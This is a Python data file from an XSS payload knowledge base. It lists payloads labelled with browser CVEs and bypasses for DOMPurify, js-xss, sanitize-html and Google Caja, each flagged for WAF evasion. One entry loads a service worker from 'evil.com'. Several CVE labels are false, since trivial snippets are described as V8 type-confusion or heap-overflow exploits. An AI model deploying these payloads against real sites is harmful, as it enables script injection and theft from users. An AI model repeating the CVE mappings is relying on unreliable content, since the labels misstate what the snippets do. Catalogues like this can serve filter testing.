#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

1-Day XSS Payloads - Part 1
CVE-based exploits and sanitizer bypasses (DOMPurify, js-xss, sanitize-html, Google Caja).
"""

from ..models import PayloadEntry


BRS_KB_1DAY_CVE_PAYLOADS_PART1 = {
    # ============================================================
    # CVE-BASED EXPLOITS
    # ============================================================
    # CVE-2020-6519 - Chrome CSP Bypass
    "cve-2020-6519-csp-bypass": PayloadEntry(
        payload='<iframe src="javascript:alert(origin)">',
        contexts=["html_content", "csp_bypass"],
        severity="critical",
        cvss_score=9.0,
        description="CVE-2020-6519: Chrome CSP bypass via javascript: in iframe",
        tags=["cve", "chrome", "csp", "2020"],
        bypasses=["csp"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="medium",
    ),
    # CVE-2019-5786 - Chrome FileReader UAF (memory corruption leading to XSS)
    "cve-2019-5786-filereader": PayloadEntry(
        payload="new FileReader().readAsArrayBuffer(new Blob([alert(1)||'']))",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2019-5786: FileReader use-after-free pattern",
        tags=["cve", "chrome", "filereader", "2019"],
        bypasses=["sandbox"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # CVE-2021-21224 - V8 Type Confusion
    "cve-2021-21224-v8": PayloadEntry(
        payload="({})[-1]=alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2021-21224: V8 type confusion pattern",
        tags=["cve", "v8", "type-confusion", "2021"],
        bypasses=["sandbox"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # CVE-2020-15999 - FreeType Heap Buffer Overflow
    "cve-2020-15999-freetype": PayloadEntry(
        payload='<svg><text style="font-family:x" onload="alert(1)">',
        contexts=["html_content", "svg"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2020-15999: FreeType font processing vector",
        tags=["cve", "freetype", "font", "2020"],
        bypasses=["svg_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox"],
        reliability="low",
    ),
    # CVE-2021-30551 - V8 Type Confusion in Map
    "cve-2021-30551-map": PayloadEntry(
        payload="new Map([[{},alert]])",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2021-30551: V8 Map type confusion",
        tags=["cve", "v8", "map", "2021"],
        bypasses=["sandbox"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # CVE-2022-1096 - V8 Type Confusion
    "cve-2022-1096-v8": PayloadEntry(
        payload="Array.prototype.constructor=function(){alert(1)}",
        contexts=["javascript"],
        severity="critical",
        cvss_score=9.0,
        description="CVE-2022-1096: V8 type confusion in Array",
        tags=["cve", "v8", "array", "2022"],
        bypasses=["prototype_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # CVE-2021-21220 - V8 Incorrect bytecode
    "cve-2021-21220-bytecode": PayloadEntry(
        payload="function f(){const a=[];a[0]=1.1;return a}",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2021-21220: V8 bytecode vulnerability",
        tags=["cve", "v8", "bytecode", "2021"],
        bypasses=["jit"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # CVE-2020-16040 - V8 Insufficient Data Validation
    "cve-2020-16040-validation": PayloadEntry(
        payload="Object.defineProperty([],'length',{value:0xffffffff})",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2020-16040: V8 data validation bypass",
        tags=["cve", "v8", "validation", "2020"],
        bypasses=["length_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # CVE-2019-11707 - Firefox IonMonkey
    "cve-2019-11707-ionmonkey": PayloadEntry(
        payload="Array.prototype.push.apply([],{length:0xffffffff})",
        contexts=["javascript"],
        severity="critical",
        cvss_score=9.0,
        description="CVE-2019-11707: Firefox IonMonkey type confusion",
        tags=["cve", "firefox", "ionmonkey", "2019"],
        bypasses=["jit"],
        waf_evasion=True,
        browser_support=["firefox"],
        reliability="low",
    ),
    # CVE-2019-11708 - Firefox Sandbox Escape
    "cve-2019-11708-sandbox": PayloadEntry(
        payload="navigator.serviceWorker.register('//evil.com/sw.js')",
        contexts=["javascript"],
        severity="critical",
        cvss_score=9.5,
        description="CVE-2019-11708: Firefox sandbox escape pattern",
        tags=["cve", "firefox", "sandbox", "2019"],
        bypasses=["sandbox"],
        waf_evasion=True,
        browser_support=["firefox"],
        reliability="low",
    ),
    # CVE-2021-26411 - IE Memory Corruption
    "cve-2021-26411-ie": PayloadEntry(
        payload='<object data="javascript:alert(1)">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="CVE-2021-26411: IE object data vulnerability",
        tags=["cve", "ie", "object", "2021"],
        bypasses=["object_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="medium",
    ),
    # CVE-2021-21193 - Chrome Heap Buffer Overflow in V8
    "cve-2021-21193-heap": PayloadEntry(
        payload="new ArrayBuffer(0x7fffffff)",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2021-21193: V8 heap buffer overflow",
        tags=["cve", "v8", "heap", "2021"],
        bypasses=["buffer_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # CVE-2022-22620 - WebKit UAF
    "cve-2022-22620-webkit": PayloadEntry(
        payload='<animate onend="alert(1)">',
        contexts=["svg"],
        severity="critical",
        cvss_score=9.0,
        description="CVE-2022-22620: WebKit use-after-free in animation",
        tags=["cve", "webkit", "safari", "2022"],
        bypasses=["svg_filters"],
        waf_evasion=True,
        browser_support=["safari"],
        reliability="low",
    ),
    # CVE-2022-26485 - Firefox XSLT UAF
    "cve-2022-26485-xslt": PayloadEntry(
        payload='<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><script>alert(1)</script></xsl:template></xsl:stylesheet>',
        contexts=["xml"],
        severity="critical",
        cvss_score=9.0,
        description="CVE-2022-26485: Firefox XSLT processing vulnerability",
        tags=["cve", "firefox", "xslt", "2022"],
        bypasses=["xslt_filters"],
        waf_evasion=True,
        browser_support=["firefox"],
        reliability="low",
    ),
    # CVE-2022-26486 - Firefox WebGPU
    "cve-2022-26486-webgpu": PayloadEntry(
        payload="navigator.gpu?.requestAdapter().then(a=>alert(a))",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="CVE-2022-26486: Firefox WebGPU vulnerability",
        tags=["cve", "firefox", "webgpu", "2022"],
        bypasses=["gpu_filters"],
        waf_evasion=True,
        browser_support=["firefox", "chrome"],
        reliability="low",
    ),
    # ============================================================
    # SANITIZER BYPASSES (DOMPurify, etc.)
    # ============================================================
    # DOMPurify < 2.0.17 mXSS
    "dompurify-2.0.17-mxss": PayloadEntry(
        payload="<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="DOMPurify < 2.0.17 mutation XSS bypass",
        tags=["dompurify", "mxss", "bypass"],
        bypasses=["dompurify"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # DOMPurify < 2.2.2 namespace bypass
    "dompurify-2.2.2-namespace": PayloadEntry(
        payload='<svg><p><style><g title="</style><img src onerror=alert(1)>">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="DOMPurify < 2.2.2 namespace confusion",
        tags=["dompurify", "namespace", "bypass"],
        bypasses=["dompurify"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # DOMPurify < 2.3.0 SVG bypass
    "dompurify-2.3.0-svg": PayloadEntry(
        payload='<svg><a><rect width="100" height="100"></rect><set attributeName="href" to="javascript:alert(1)"/></a></svg>',
        contexts=["html_content", "svg"],
        severity="critical",
        cvss_score=9.0,
        description="DOMPurify < 2.3.0 SVG set element bypass",
        tags=["dompurify", "svg", "bypass"],
        bypasses=["dompurify"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="medium",
    ),
    # js-xss bypass
    "js-xss-bypass-1": PayloadEntry(
        payload='<a href="javasc&#x72;ipt:alert(1)">click</a>',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="js-xss library entity bypass",
        tags=["js-xss", "entity", "bypass"],
        bypasses=["js-xss"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # sanitize-html bypass
    "sanitize-html-bypass": PayloadEntry(
        payload='<div data-x="<img src=x onerror=alert(1)>">',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="sanitize-html data attribute bypass",
        tags=["sanitize-html", "data", "bypass"],
        bypasses=["sanitize-html"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # Google Caja bypass
    "caja-bypass-1": PayloadEntry(
        payload='<div onclick="___ONERROR_HANDLER___.call(this,event)">click</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Google Caja sandbox bypass",
        tags=["caja", "sandbox", "bypass"],
        bypasses=["caja"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
}
